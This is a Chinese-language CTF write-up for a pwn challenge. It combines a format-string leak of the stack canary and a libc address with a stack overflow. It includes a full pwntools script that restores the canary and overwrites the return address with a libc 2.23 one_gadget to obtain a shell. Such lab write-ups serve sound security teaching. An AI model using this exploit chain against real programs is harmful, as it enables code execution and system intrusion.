# week3canary_eats_pie

## 题目简述

程序同时存在格式化字符串和栈溢出。格式串可以从栈上泄露 Canary 与 libc 返回地址；恢复 Canary 并计算 libc 基址后，再通过溢出把返回地址改为 libc 2.23 的 one_gadget。

## 解题过程

实测第 13 个格式串参数是 Canary，第 15 个参数落在 `__libc_start_main+0xf0`。先一次发送两个位置参数：

```text
%13$p
%15$p
```

返回值用于恢复保护值和 libc 基址。缓冲区到 Canary 的距离为 `0x38`，其后依次是 8 字节 Canary、保存的 `rbp` 和返回地址：

```python
from pwn import *

context.arch = "amd64"
io = process("./main")
libc = ELF("./libc-2.23.so", checksec=False)

io.recvline()
io.send(b"%13$p\n%15$p\n")

canary = int(io.recvline().strip(), 16)
libc_return = int(io.recvline().strip(), 16)
libc.address = libc_return - libc.sym["__libc_start_main"] - 0xF0

log.success(f"canary: {canary:#x}")
log.success(f"libc base: {libc.address:#x}")

one_gadget = libc.address + 0x45226

payload = flat(
    b"\x00" * 0x38,
    canary,
    0,
    one_gadget,
)

io.recvline()
io.send(payload)
io.interactive()
```

`0x45226` 是题目所给 libc 2.23 的 gadget 偏移，换 libc 后必须重新计算并检查其寄存器/栈约束。

## 方法总结

利用链是“格式串泄露 Canary → 格式串泄露 libc → 保持原 Canary 完整 → 覆盖返回地址为 one_gadget”。Canary 只阻止未知保护值下的直接覆盖；一旦同一进程中存在可控信息泄露，仍可在最终 payload 中原样放回。
